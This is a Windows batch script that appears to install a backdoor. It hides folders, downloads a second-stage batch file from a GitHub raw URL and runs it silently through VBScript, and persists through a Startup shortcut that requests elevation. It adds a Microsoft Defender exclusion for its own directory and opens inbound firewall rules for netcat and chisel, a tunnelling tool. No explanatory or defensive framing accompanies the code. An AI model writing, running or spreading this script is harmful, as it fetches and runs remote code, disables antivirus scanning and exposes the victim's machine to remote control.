@echo off
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
attrib +h %homedrive%\curl
mkdir %homedrive%\ShiniGami
attrib +h %homedrive%\ShiniGami
%homedrive%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    cscript "%vbsFilePath%"
) ELSE (
    exit
)
